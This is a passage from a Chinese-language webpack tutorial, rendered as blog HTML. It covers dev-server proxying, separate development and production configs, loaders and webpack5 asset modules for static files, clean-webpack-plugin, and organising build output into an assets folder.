class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    devServer: &#123;</span><br><span class="line">      <span class="comment">// 跨域代理</span></span><br><span class="line">        proxy: &#123;</span><br><span class="line">            <span class="string">&#x27;/api&#x27;</span>: &#123;</span><br><span class="line">              target: <span class="string">&#x27;http://localhost:3000&#x27;</span>,  <span class="comment">// 代理地址</span></span><br><span class="line">              pathRewrite: &#123; <span class="string">&#x27;^/api&#x27;</span>: <span class="string">&#x27;&#x27;</span> &#125;,   <span class="comment">// 重写路径</span></span><br><span class="line">              secure: <span class="literal">false</span>,  <span class="comment">// 使用https</span></span><br><span class="line">              changeOrigin: <span class="literal">true</span>   <span class="comment">// 覆盖主机源</span></span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="多个打包配置"><a href="#多个打包配置" class="headerlink" title="多个打包配置"></a>多个打包配置</h2><p>通常我们项目都会有开发环境和生产环境。</p><p>前面我们也看到了<code>webpack</code>提供了一个<code>mode</code>选项，但我们开发中不太可能说开发的时候<code>mode</code>设置为<code>development</code>，然后等到要打包才设置为<code>production</code>。当然，前面我们也说了，我们可以通过命令<code>--mode</code>来对应匹配<code>mode</code>选项。</p><p>但如果开发环境和生产环境的<code>webpack</code>配置差异不仅仅只有<code>mode</code>选项的话，我们可能需要考虑多份打包配置了。</p><h3 id="多个webpack配置文件"><a href="#多个webpack配置文件" class="headerlink" title="多个webpack配置文件"></a>多个webpack配置文件</h3><p>我们默认的<code>webpack</code>配置文件名为<code>webpack.config.js</code>，而<code>webpack</code>执行的时候，也默认会找该配置文件。</p><p>但如果我们不使用该文件名，而改成<code>webpack.conf.js</code>的话，<code>webpack</code>正常执行是会使用默认配置的，因此我们需要使用一个<code>--config</code>选项，来指定配置文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webpack --config webpack.conf.js</span><br></pre></td></tr></table></figure><p>因此，我们就可以分别配置一个开发环境的配置<code>webpack.dev.js</code>和生成环境的配置<code>webpack.prod.js</code>，然后通过指令进行执行不同配置文件：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// package.json</span></span><br><span class="line"> &quot;scripts&quot;: &#123;</span><br><span class="line">   &quot;dev&quot;: &quot;webpack --config webpack.dev.js&quot;,</span><br><span class="line">   &quot;build&quot;: &quot;webpack --config webpack.prod.js&quot;,</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="单个配置文件"><a href="#单个配置文件" class="headerlink" title="单个配置文件"></a>单个配置文件</h3><p>如果说，你不想创建那么多配置文件的话，我们也可以只只用<code>webpack.config.js</code>来实现多份打包配置。</p><p>按照前面说的使用<code>--mode</code>配置<code>mode</code>选项，其实我们可以在<code>webpack.config.js</code>中拿到这个变量，因此我们就可以通过这个变量去返回不同的配置文件。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// argv.mode可以获取到配置的mode选项</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">env, argv</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (argv.mode === <span class="string">&#x27;development&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 返回开发环境的配置选项</span></span><br><span class="line">    <span class="keyword">return</span> &#123; ... &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span> (argv.mode === <span class="string">&#x27;production&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 返回生产环境的配置选项</span></span><br><span class="line">    <span class="keyword">return</span> &#123; ... &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="静态资源处理"><a href="#静态资源处理" class="headerlink" title="静态资源处理"></a>静态资源处理</h2><p>当我们使用了图片、视频或字体等等其他静态资源的话，我们需要用到<code>url-loader</code>和<code>file-loader</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> url-loader -&gt; 4.1.1; file-loader -&gt; 6.2.0</span></span><br><span class="line">yarn add url-loader file-loader -D</span><br></pre></td></tr></table></figure><p>首先我们在项目中引入一张图片，然后在引入到<code>index.js</code>中。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pic <span class="keyword">from</span> <span class="string">&quot;./image.png&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src= pic;</span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">&#x27;body&#x27;</span>).append(img);</span><br></pre></td></tr></table></figure><p>然后我先使用<code>url-loader</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.(png|je?pg|gif|webp)$/</span>,</span><br><span class="line">        use: [<span class="string">&#x27;url-loader&#x27;</span>]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后执行一下打包。</p><p>你会发现，<code>dist</code>路径下没有图片文件，但是你打开页面是可以看到图片的，且通过调试工具，我们可以看到其实<code>url-loader</code>默认会将静态资源转成<code>base64</code>。</p><p>当然，<code>url-loader</code>选项有提供一个属性，叫<code>limit</code>，就是我们可以设置一个文件大小阈值，当文件大小超过这个值的时候，<code>url-loader</code>就不会转成<code>base64</code>，而是直接打包成文件。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.(png|je?pg|gif|webp)$/</span>,</span><br><span class="line">        use: [&#123;</span><br><span class="line">          loader: <span class="string">&#x27;url-loader&#x27;</span>,</span><br><span class="line">          options: &#123;</span><br><span class="line">            name: <span class="string">&#x27;[name].[ext]&#x27;</span>,   <span class="comment">// 使用占位符设置导出名称</span></span><br><span class="line">            limit: <span class="number">1024</span> * <span class="number">10</span>  <span class="comment">// 设置转成base64阈值，大于10k不转成base64</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这时候我们再打包一下，<code>dist</code>文件夹下就会出现了图片文件。</p><p>而<code>file-loader</code>其实跟<code>url-loader</code>差不多，但它默认就是导出文件，而不会导出<code>base64</code>的。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.(png|je?pg|gif|webp)$/</span>,</span><br><span class="line">        use: [<span class="string">&#x27;file-loader&#x27;</span>]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>打包一下，会发现<code>dist</code>文件夹下依旧会打包成一个图片文件，但是它的名称会被改成哈希值，我们可以通过<code>options</code>选项来设置导出的名称。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.(png|je?pg|gif|webp)$/</span>,</span><br><span class="line">        use: [&#123;</span><br><span class="line">          loader: <span class="string">&#x27;file-loader&#x27;</span>,</span><br><span class="line">          options: &#123;</span><br><span class="line">            name: <span class="string">&#x27;[name].[ext]&#x27;</span>,   <span class="comment">// 使用占位符设置导出名称</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而对于视频文件、字体文件，也是用相同的方法，只不过是修改<code>test</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      <span class="comment">// 图片</span></span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.(png|je?pg|gif|webp)$/</span>,</span><br><span class="line">        use: &#123;</span><br><span class="line">          loader: <span class="string">&#x27;url-loader&#x27;</span>,</span><br><span class="line">          options: &#123;</span><br><span class="line">            esModule: <span class="literal">false</span>,</span><br><span class="line">            name: <span class="string">&#x27;[name].[ext]&#x27;</span>,</span><br><span class="line">            limit: <span class="number">1024</span> * <span class="number">10</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">// 字体</span></span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.(woff2?|eot|ttf|otf)(\?.*)?$/</span>,</span><br><span class="line">        use: &#123;</span><br><span class="line">          loader: <span class="string">&#x27;url-loader&#x27;</span>,</span><br><span class="line">          options: &#123;</span><br><span class="line">            name: <span class="string">&#x27;[name].[ext]&#x27;</span>,</span><br><span class="line">            limit: <span class="number">1024</span> * <span class="number">10</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">// 媒体文件</span></span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.(mp4|webm|ogg|mp3|wav|flac|aac)(\?.*)?$/</span>,</span><br><span class="line">        use: &#123;</span><br><span class="line">          loader: <span class="string">&#x27;url-loader&#x27;</span>,</span><br><span class="line">          options: &#123;</span><br><span class="line">            name: <span class="string">&#x27;[name].[ext]&#x27;</span>,</span><br><span class="line">            limit: <span class="number">1024</span> * <span class="number">10</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>但现在有个问题，就是如果直接在<code>index.html</code>引入图片的话，可以顺利打包吗？</p><p>答案是不会的，我们可以测试一下。首先将图片引入<code>index.html</code>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./image.png&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后执行打包后，打包出来的<code>index.html</code>照样是<code>&lt;img src=&quot;./image.png&quot;&gt;</code>，但是我们并没有解析和打包出来<code>image.png</code>出来。</p><p>这时候我们需要借助另一个插件——<code>html-withimg-loader</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 0.1.16yarn add html-withimg-loader -D</span></span><br></pre></td></tr></table></figure><p>然后我们再添加一条<code>rules</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">test</span>: <span class="regexp">/\.html$/</span>,loader: <span class="string">&#x27;html-withimg-loader&#x27;</span> &#125;</span><br></pre></td></tr></table></figure><p>这时候打包成功后，<code>dist</code>文件成功将图片打包出来了，但是打开页面的时候，图片还是展示不出来。然后通过调试工具看的话，会发现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&quot;</span><span class="attr">default</span>&quot;<span class="attr">:</span>&quot;<span class="attr">image.png</span>&quot;&#125;&quot;&gt;</span></span><br></pre></td></tr></table></figure><p>这是因为<code>html-loader</code>使用的是<code>commonjs</code>进行解析的，而<code>url-loader</code>默认是使用<code>esmodule</code>解析的。因此我们需要设置一下<code>url-loader</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;  <span class="attr">test</span>: <span class="regexp">/\.(png|je?pg|gif|webp)$/</span>,    use: &#123;      <span class="attr">loader</span>: <span class="string">&#x27;url-loader&#x27;</span>,        <span class="attr">options</span>: &#123;          <span class="attr">esModule</span>: <span class="literal">false</span>,  <span class="comment">// 不适用esmodule解析          name: &#x27;[name].[ext]&#x27;,          limit: 1024 * 10        &#125;    &#125;&#125;</span></span><br></pre></td></tr></table></figure><p>这时候重新打包一下，页面就能成功展示图片了。</p><h3 id="Webpack5-资源模块"><a href="#Webpack5-资源模块" class="headerlink" title="Webpack5 资源模块"></a>Webpack5 资源模块</h3><blockquote><p><a href="https://link.juejin.cn/?target=https://webpack.docschina.org/guides/asset-modules/">webpack.docschina.org/guides/asse…</a></p></blockquote><p>在<code>webpack5</code>中，新添了一个资源模块，它允许使用资源文件（字体，图标等）而无需配置额外 <code>loader</code>，具体的内容大家可以看看文档，这里简单讲一下如何操作。</p><p>前面的例子，我们对静态资源都使用了<code>url-loader</code>或者<code>file-loader</code>，而在<code>webpack5</code>，我们甚至可以需要手动去安装和使用这两个<code>loader</code>，而直接设置一个<code>type</code>属性。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;  <span class="attr">test</span>: <span class="regexp">/\.(png|jpe?g|gif|svg|eot|ttf|woff|woff2)$/i</span>,  type: <span class="string">&quot;asset/resource&quot;</span>,&#125;</span><br></pre></td></tr></table></figure><p>然后打包测试后，静态文件都会直接打包成文件并自动引入，效果跟<code>file-loader</code>一致。</p><p><code>type</code>值提供了四个选项：</p><ul><li><strong><code>asset/resource</code>：</strong> 发送一个单独的文件并导出 URL。之前通过使用 <code>file-loader</code> 实现。</li><li><strong><code>asset/inline</code> ：</strong> 导出一个资源的 data URI。之前通过使用 <code>url-loader</code> 实现。</li><li><strong><code>asset/source </code> ：</strong>导出资源的源代码。之前通过使用 <code>raw-loader</code> 实现。</li><li><strong><code>asset</code>：</strong>  在导出一个 data URI 和发送一个单独的文件之间自动选择。之前通过使用 <code>url-loader</code>，并且配置资源体积限制实现。</li></ul><p>同时，我们可以在<code>output</code>设置输出<code>bundle</code>静态文件的名称：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">output: &#123;  <span class="attr">path</span>: path.resolve(__dirname, <span class="string">&#x27;dist/&#x27;</span>),  <span class="attr">filename</span>: <span class="string">&#x27;[name].js&#x27;</span>,  <span class="comment">// 设置静态bundle文件的名称  assetModuleFilename: &#x27;[name][ext]&#x27;&#125;</span></span><br></pre></td></tr></table></figure><h2 id="清理打包路径"><a href="#清理打包路径" class="headerlink" title="清理打包路径"></a>清理打包路径</h2><p>在每次打包前，我们其实都需要去清空一下打包路径的文件。</p><p>如果文件重名的话，<code>webpack</code>还会自动覆盖，但是实际中我们都会在打包文件名称中加入哈希值，因此清空的操作不得不实现。</p><p>这时候我们需要使用一个插件——<code>clean-webpack-plugin</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add clean-webpack-plugin -D</span><br></pre></td></tr></table></figure><p>然后只需引入到配置文件且在<code>plugins</code>配置就可以使用了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="comment">// 引入CleanWebpackPlugin</span></span><br><span class="line"><span class="keyword">const</span> &#123;CleanWebpackPlugin&#125; = <span class="built_in">require</span>(<span class="string">&#x27;clean-webpack-plugin&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    entry: <span class="string">&#x27;./src/index.js&#x27;</span>,</span><br><span class="line">    output: &#123;</span><br><span class="line">        path: path.resolve(__dirname, <span class="string">&#x27;dist/&#x27;</span>),</span><br><span class="line">        filename: <span class="string">&#x27;[name].js&#x27;</span>,</span><br><span class="line">        publicPath: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    plugins: [</span><br><span class="line">      <span class="comment">// 使用CleanWebpackPlugin</span></span><br><span class="line">        <span class="keyword">new</span> CleanWebpackPlugin(),</span><br><span class="line">    ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>有些情况下，我们不需要完全清空打包路径，这时候我们可以使用到一个选项，叫<code>cleanOnceBeforeBuildPatterns</code>，它是一个数组，默认是<code>[**/*]</code>，也就是清理<code>output.path</code>路径下所有东西。而你可以在里面输入只想删除的文件，同时我们可以输入不想删除的文件，只需要在前面加上一个<code>!</code>。</p><blockquote><p>需要注意的是，<code>cleanOnceBeforeBuildPatterns</code>这个选项是可以删除打包路径下之外的文件，只需要你配上绝对路径的话。因此<code>CleanWebpackPlugin</code>还提供了一个选项供测试——<code>dry</code>，默认是为<code>false</code>，当你设置为<code>true</code>后，它就不会真正的执行删除，而是只会在命令行打印出被删除的文件，这样子更好的避免测试过程中误删。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;CleanWebpackPlugin&#125; = <span class="built_in">require</span>(<span class="string">&#x27;clean-webpack-plugin&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    entry: <span class="string">&#x27;./src/index.js&#x27;</span>,</span><br><span class="line">    output: &#123;</span><br><span class="line">        path: path.resolve(__dirname, <span class="string">&#x27;dist/&#x27;</span>),</span><br><span class="line">        filename: <span class="string">&#x27;[name].js&#x27;</span>,</span><br><span class="line">        publicPath: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    plugins: [</span><br><span class="line">        <span class="keyword">new</span> CleanWebpackPlugin(&#123;</span><br><span class="line">          <span class="comment">// dry: true   // 打开可测试，不会真正执行删除动作</span></span><br><span class="line">            cleanOnceBeforeBuildPatterns: [</span><br><span class="line">                <span class="string">&#x27;**/*&#x27;</span>,  <span class="comment">// 删除dist路径下所有文件</span></span><br><span class="line">                <span class="string">`!package.json`</span>,  <span class="comment">// 不删除dist/package.json文件</span></span><br><span class="line">            ],</span><br><span class="line">        &#125;),</span><br><span class="line">    ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="文件归类"><a href="#文件归类" class="headerlink" title="文件归类"></a>文件归类</h2><p>在目前我们的测试代码中，我们的<code>src</code>文件夹如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">├── src</span><br><span class="line">│   ├── Alata-Regular.ttf</span><br><span class="line">│   ├── image.png</span><br><span class="line">│   ├── index.html</span><br><span class="line">│   ├── index.js</span><br><span class="line">│   ├── style.css</span><br><span class="line">│   └── style.scss</span><br></pre></td></tr></table></figure><p>而正常项目的话，我们会使用文件夹将其分好类，这并不难，我们先简单归类一下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">├── src</span><br><span class="line">│   ├── index.html</span><br><span class="line">│   ├── js</span><br><span class="line">│   │   └── index.js</span><br><span class="line">│   ├── static</span><br><span class="line">│   │   └── image.png</span><br><span class="line">│   │   └── Alata-Regular.ttf</span><br><span class="line">│   └── style</span><br><span class="line">│       ├── style.css</span><br><span class="line">│       └── style.scss</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来，我们需要打包出来的文件也是归类好的，这里就不太复杂，直接用一个<code>assets</code>文件夹将所有静态文件放进去，然后<code>index.html</code>放外面。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">├── dist</span><br><span class="line">│   ├── assets</span><br><span class="line">│   │   ├── Alata-Regular.ttf</span><br><span class="line">│   │   ├── image.png</span><br><span class="line">│   │   ├── main.css</span><br><span class="line">│   │   └── main.js</span><br><span class="line">│   └── index.html</span><br></pre></td></tr></table></figure><p>这里先补充一下<code>style.css</code>引入字体的代码：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&quot;test-font&quot;</span>;</span><br><span class="line">    <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">&quot;../static/Alata-Regular.ttf&quot;</span>) <span class="built_in">format</span>(<span class="string">&#x27;truetype&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&quot;test-font&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，我们先将打包出来的<code>JavaScript</code>文件放入<code>assets</code>文件夹下，我们只需要修改<code>output.filename</code>即可。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">output: &#123;</span><br><span class="line">  path: path.resolve(__dirname, <span class="string">&#x27;dist/&#x27;</span>),</span><br><span class="line">  filename: <span class="string">&#x27;assets/[name].js&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其次，我们将打包出来的<code>css</code>文件也放入<code>assets</code>路径下，因为我们打包<code>css</code>是使用<code>miniCssExtractPlugin</code>，因此我们只需要配置一下<code>miniCssExtractPlugin</code>的<code>filename</code>即可：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">new</span> miniCssExtractPlugin(&#123;</span><br><span class="line">    filename: <span class="string">&quot;assets/[name].css&quot;</span></span><br><span class="line">  &#125;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>最后就是静态资源了，这里我们使用静态模块方案，所以直接修改<code>output.assetModuleFilename</code>即可：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">output: 